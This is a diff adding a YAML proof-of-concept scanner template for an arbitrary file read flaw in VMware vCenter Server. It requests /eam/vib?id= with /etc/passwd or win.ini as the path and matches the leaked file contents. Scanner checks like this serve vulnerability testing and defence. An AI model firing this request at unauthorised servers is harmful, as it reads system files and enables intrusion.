@@ -1,0 +1,23 @@
+id: poc-yaml-vmware-vcenter-vib-arbitrary-file-read
+info:
+  name: VMware vCenter Server 任意文件读取漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: VMware
+  osprey-id: vb_2020_0074
+variables:
+  v_path: '/etc/passwd
+
+    C:/windows/win.ini
+
+    '
+requests:
+- method: GET
+  path: /eam/vib?id={{.v_path}}
+  headers: {}
+  expression: "(\n  contains(body, \"root:\") && !contains(body, \"<\") && contains(body,\
+    \ \"/bin\")\n) || (\n  contains(body, \"; for 16-bit app support\") && !contains(body,\
+    \ \"<\")\n)\n"
+transport: http
